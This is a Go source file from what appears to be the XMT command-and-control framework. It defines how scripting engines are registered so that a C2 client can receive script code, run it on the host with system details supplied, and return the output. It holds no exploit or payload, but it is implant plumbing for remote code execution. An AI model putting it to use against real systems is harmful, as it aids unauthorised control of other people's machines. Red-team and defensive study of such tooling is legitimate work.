//go:build scripts

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"context"

	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// Engine is an interface that allows for extending XMT with non-compiled code
// for easy deploy-ability and flexibility.
//
// Each Script interface contains a single function that will take a Context,
// an environment block and the script code string.
//
// The result of this function will be the output of the script and any errors
// that may occur.
//
// By default, the 'ID', 'OS', 'PID' 'PPID', 'OSVER' and 'HOSTNAME' variables
// are built-in to assist with code runtime.
type Engine interface {
	Invoke(context.Context, map[string]any, string) (string, error)
}

// RegisterEngine is a function that can be used to register a Scripting engine
// into the XMT client tasking runtime.
//
// Script engines can increase the footprint of the compiled binary, so engines
// must be registered manually.
//
// See the 'cmd/script' package for scripting engines.
//
// C2 Details:
//
//	ID: <Supplied>
//
//	Input:
//	    string (script)
//	Output:
//	    string (output)
func RegisterEngine(i uint8, s Engine) error {
	if i < 21 {
		return xerr.Sub("mapping ID is invalid", 0x63)
	}
	if Mappings[i] != nil {
		return xerr.Sub("mapping ID is already exists", 0x64)
	}
	Mappings[i] = func(x context.Context, r data.Reader, w data.Writer) error {
		c, err := r.StringVal()
		if err != nil {
			return err
		}
		o, err := s.Invoke(x, createEnvironment(), c)
		if err != nil {
			return err
		}
		w.WriteString(o)
		return nil
	}
	return nil
}
